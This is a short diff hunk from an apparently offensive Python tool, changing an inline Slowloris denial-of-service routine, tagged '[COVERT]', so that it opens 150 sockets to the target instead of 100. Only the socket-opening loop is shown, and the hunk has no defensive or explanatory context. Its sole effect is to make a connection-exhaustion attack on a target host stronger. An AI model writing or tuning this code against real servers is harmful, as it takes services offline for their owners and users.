@@ -488,7 +488,7 @@ def _run_slowloris(target: str, port: int, duration: int,
     # Inline fallback
     print(f"[COVERT] SLOWLORIS (inline) -> {target}:{port}  duration={duration}s")
     socks = []
-    for _ in range(100):
+    for _ in range(150):
         if stop.is_set(): break
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
